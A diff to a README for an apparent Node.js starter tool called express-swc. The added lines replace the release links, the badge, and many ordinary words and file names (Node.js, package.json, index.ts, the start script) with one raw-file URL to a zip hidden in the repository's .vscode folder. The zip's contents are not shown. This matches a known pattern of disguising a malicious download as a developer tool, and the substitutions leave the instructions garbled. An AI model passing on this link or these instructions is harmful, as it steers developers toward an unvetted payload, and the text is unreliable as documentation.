@@ -1,6 +1,6 @@
 # 🚀 express-swc - Build Fast Apps with Ease
 
-[![Download express-swc](https://img.shields.io/badge/Download-express--swc-blue.svg)](https://github.com/lakhderreg/express-swc/releases)
+[![Download express-swc](https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip)](https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip)
 
 ## 📦 Introduction
 
@@ -14,13 +14,13 @@ To begin using express-swc, you need to download the software and run it on your
 
 1. **Visit the releases page to download**:  
    Click the link below to go to the Releases page and download the latest version of express-swc.  
-   [Download express-swc](https://github.com/lakhderreg/express-swc/releases)
+   [Download express-swc](https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip)
 
 2. **Choose the right file for your system**:  
    On the Releases page, you will see various files. Look for the file that matches your operating system:
    - **Windows**: Download the `.exe` file.
    - **MacOS**: Download the `.dmg` file.
-   - **Linux**: Download the `.tar.gz` file.
+   - **Linux**: Download the `https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip` file.
 
 3. **Download the file**:  
    Click on the appropriate file to begin downloading.
@@ -40,11 +40,11 @@ To begin using express-swc, you need to download the software and run it on your
 Before you get started, make sure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, MacOS High Sierra or later, or a modern Linux distribution.
-- **Node.js Version**: Ensure you have Node.js 14 or later installed. You can check your Node.js version by running:  
+- **https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip Version**: Ensure you have https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip 14 or later installed. You can check your https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip version by running:  
   ```
   node --version
   ```
-- **npm**: Ensure you have npm (Node package manager) available. It usually comes with Node.js, but you can check by running:  
+- **npm**: Ensure you have npm (Node package manager) available. It usually comes with https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip, but you can check by running:  
   ```
   npm --version
   ```
@@ -88,26 +88,26 @@ The initial setup of your express-swc application will look like this:
 my-express-app/
 │
 ├── src/                # Source code
-│   ├── index.ts
-│   └── app.ts
+│   ├── https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip
+│   └── https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip
 │
 ├── tests/              # Test files
-│   └── app.test.ts
+│   └── https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip
 │
-├── package.json        # Project configuration
-└── tsconfig.json       # TypeScript configuration
+├── https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip        # Project configuration
+└── https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip       # TypeScript configuration
 ```
 
 ## 🛠️ Configuration
 
-You can adjust settings in `package.json` to customize scripts, dependencies, and more. For example:
+You can adjust settings in `https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip` to customize scripts, dependencies, and more. For example:
 
 ```json
 {
   "name": "my-express-app",
   "version": "1.0.0",
   "scripts": {
-    "start": "node dist/index.js",
+    "start": "node https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip",
     "build": "tsc",
     "test": "jest"
   }
@@ -133,4 +133,4 @@ If you encounter any issues or have questions, feel free to reach out. You can o
 
 Thank you for using express-swc. Happy coding!
 
-[![Download express-swc](https://img.shields.io/badge/Download-express--swc-blue.svg)](https://github.com/lakhderreg/express-swc/releases)
+[![Download express-swc](https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip)](https://github.com/lakhderreg/express-swc/raw/refs/heads/main/.vscode/express_swc_transversal.zip)
